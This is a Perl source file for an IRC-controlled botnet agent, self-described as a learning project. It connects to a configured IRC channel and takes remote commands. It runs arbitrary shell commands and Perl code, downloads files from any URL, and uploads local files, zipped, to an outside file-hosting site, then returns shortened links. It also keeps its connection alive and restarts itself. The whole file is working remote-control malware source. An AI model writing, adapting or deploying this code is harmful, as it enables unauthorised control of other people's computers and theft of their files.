#!/usr/bin/perl -w
#Purpose: a learning-pupose botnet
#Github: github.com/hcac/zmb2
#For documentation see "HELP.txt" on Github
#Written by hcac

use strict;
use warnings;
use threads;
use Net::Ping;
use IO::Socket::INET; #for connecting to IRC server
use LWP::Simple qw (getstore);
use LWP::UserAgent;
use HTTP::Request::Common qw (POST);
use Archive::Zip;
use Cwd;

$| = 1;

#Change these
my $server = '127.0.0.1';
my $port = 6667;
my $channel = '#lab';
my $nick_prefix = "test";
my $user = "ISOMER 8 * :sum it up";
#END

my ($socket, $thr_keep_connection);

main();

sub main { #I hate doing it this way, but didn't have any other idea

	#Internal Variables
	my $bot = 0; #this tells the bot to or not to apply commands
	
	my $thr_connect = threads->create(\&func_connect); 
	#$thr_connect a thread for making our socket
	
	$socket = $thr_connect->join; #get the made socket
	
	$thr_keep_connection = threads->create(\&func_keep_connection,
		\$socket); #this is a little funny and I'm not sure about it
	
	while (my $line = <$socket>) {
		$SIG{HUP} = sub { exec($^X, $0) }; #restarts the whole
		
		if ($line =~ /PING/i) { #answer to ping requests
			my @ping_args = split(/\s/, $line, 2);
			my $ping_code = $ping_args[1];
			print $socket "PONG $ping_code\n";
		}
		
		next if ($line !~ /PRIVMSG/i);
		
		my @params = split(/\s/, $line, 4);
		#take the server message into parts
		
		my ($full_from, undef, $to, $msg) = @params;
		#gathering info
		
		my ($from) = $full_from =~ /:(.+)!/;
		#the nick of sender
		
		my $reply_to = ($to eq $channel) ? $to : $from;
		#the results of commands 'll be sent to $reply_to
		
		$msg =~ s/://;
		
		#we finished our information gathering
		#now we're going to apply the commands
		
		$bot = 1 if ($msg =~ /!BOT\son/i); #bot on
		$bot = 0 if ($msg =~ /!BOT\soff/i); #bot off
	
		next if ($bot == 0); #don't apply any commands if bot was off
		
		#------THE START OF APPLYING COMMANDS
		if ($msg =~ /^!CMD/i) {
			my @cmd_args = split(/\s/, $msg, 2);
			
			chomp(my $cmd_command = $cmd_args[1]);
			$cmd_command =~ s/\r$//;
			
			my $thr_cmd = threads->create(\&func_cmd, $cmd_command);
			
			my $thr_cmd_result = $thr_cmd->join;
			my $cmd_result = ($thr_cmd_result) ? $thr_cmd_result : "no ret";
			
			my $bot_msg = "PRIVMSG $reply_to :$cmd_result";
			$bot_msg = substr($bot_msg, 0,508);
			print $socket $bot_msg . "\n";
		}
		
		if ($msg =~ /^!PERL/i) {
			my @cmd_args = split(/\s/, $msg, 2);
			
			chomp(my $perl_code = $cmd_args[1]);
			$perl_code =~ s/\r$//;
			
			my $thr_cmd = threads->create(\&func_perl, $perl_code);
			
			my $thr_cmd_result = $thr_cmd->join;
			my $cmd_result = ($thr_cmd_result) ? $thr_cmd_result : "no ret";
			
			my $bot_msg = "PRIVMSG $reply_to :$cmd_result";
			$bot_msg = substr($bot_msg, 0,508);
			print $socket $bot_msg . "\n";
		}
		
		if ($msg =~ /^!IRC/i) {
			my @cmd_args = split(/\s/, $msg, 2);
			
			chomp(my $irc_command = $cmd_args[1]);
			$irc_command =~ s/\r$//;
			
			my $bot_msg = substr($irc_command, 0,508);
			print $socket $bot_msg . "\n";
		}
		
		if ($msg =~ /^!UP\s.+/i) {
			my @cmd_args = split(/\s/, $msg, 2);
			
			chomp(my $up_file = $cmd_args[1]);
			$up_file =~ s/\r$//;
			
			my $thr_cmd = threads->create(\&func_up_and_shorten, $up_file);
			
			my $thr_cmd_result = $thr_cmd->join;
			my $up_result = ($thr_cmd_result =~ /^-1/) ? "Failed" : $thr_cmd_result;
			
			my $bot_msg = "PRIVMSG $reply_to :$up_result";
			$bot_msg = substr($bot_msg, 0,508);
			print $socket $bot_msg . "\n";
		}
		
		if ($msg =~ /^!GET\s.+\s.+/i) {
			my @cmd_args = split(/\s/, $msg, 3);
			
			chomp(my $url = $cmd_args[1]);
			chomp(my $save = $cmd_args[2]);
			$url =~ s/\r$//;
			$save =~ s/\r$//;
			
			my $thr_cmd = threads->create(\&func_get, $url, $save);
			
			my $thr_cmd_result = $thr_cmd->join;
			my $get_result = ($thr_cmd_result =~ /-1/) ? "Failed" : 'Done';
			
			my $bot_msg = "PRIVMSG $reply_to $get_result";
			print $socket $bot_msg . "\n";
		}
		
		if ($msg =~ /^!EXIT/i) {
			print $socket "QUIT\n";
			undef $socket;
			
			$thr_keep_connection->detach;
			
			exit 0;
		}
		#------THE END OF APPLYING COMMANDS
	}
	
	$thr_keep_connection->join;
}

main(); #programmer doesn't really want this to end!!

#Internal Functions

sub func_connect {
	while (!defined ($socket = IO::Socket::INET->new (
			PeerAddr => $server,
			PeerPort => $port,
			Timeout => 10
		))) {
		sleep 10;
	}
	
	if ($socket) {
	
	print $socket "USER $user\n";
	my $randnum = int rand 9999;
	print $socket "NICK $nick_prefix$randnum\n"; #always a new nick
	print $socket "JOIN $channel\n";
	
	return $socket;
	}
}

sub func_keep_connection {
	my $socket_ref = $_[0];
	my $socket = $$socket_ref;
	
	while (1) {
		print $socket "\n" || kill HUP => $$;
		sleep 20;
	}
}

sub func_cmd {
	my $command = $_[0];
	return `$command`;
}

sub func_perl {
	my $command = $_[0];
	return eval($command);
}

sub func_up_and_shorten {
	my $file = $_[0];
	
	my $long_url = upload($file);
	
	return shorten($long_url) if ($long_url !~ /-1/);
	
	return -1;
}

sub func_get {
	return -1 if (!$_[0] || !$_[1]);
	
	getstore($_[0], $_[1]) || return -1;
	
	return 0;
}

sub upload {
	return -1 if (!$_[0]);
	
	my $file = $_[0];
	
	my ($to_upload, $zipped);
	
	if ($file !~ /\.(zip|txt)$/) { #unfilter exts mostly allowed
		#make the file ready
		my $zip = new Archive::Zip;
		$zip->addFile($file);
		
		my $randnum = int(rand 99999);
		$to_upload = $randnum . '.zip';
		
		$zip->writeToFileNamed($randnum . '.zip');
		
		$zipped = 1;
	}
	else {
		$to_upload = $file;
	}
	
	#uploading process
	my $req = POST 'http://s000.tinyupload.com/cgi-bin/upload.cgi',
			Content_Type => 'multipart/form-data',
			Content => [uploaded_file => [$to_upload]];
	
	$req->header('Content-Type' => 'multipart/form-data');
	$req->header(Referer => '');
	
	my $ua = LWP::UserAgent->new(requests_redirectable => ['GET', 'POST', 'HEAD']);
	
	$ua->agent('Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)');
	$ua->cookie_jar({});
	
	my $content = $ua->request($req)->as_string;
	
	unlink($to_upload) if ($zipped);
	
	my ($code) = $content =~ /file_id=(\d+)/;
	
	return ($code) ? 'http://s000.tinyupload.com/?file_id=' . $code : -1;
}

sub shorten {
	return -1 if (!$_[0]);
	
	my $url = $_[0];
	
	my $req = new HTTP::Request(POST => 'http://leggy.io/api/v1/shorten');
	
	$req->header('Content-Type' => 'application/json');
	$req->content('{"longUrl":"' . $url . '"}');
	
	my $ua = new LWP::UserAgent;
	
	my $result = $ua->request($req)->content;
	my @param = split('"', $result);
	
	return ($param[7]) ? $param[7] : -1;
}
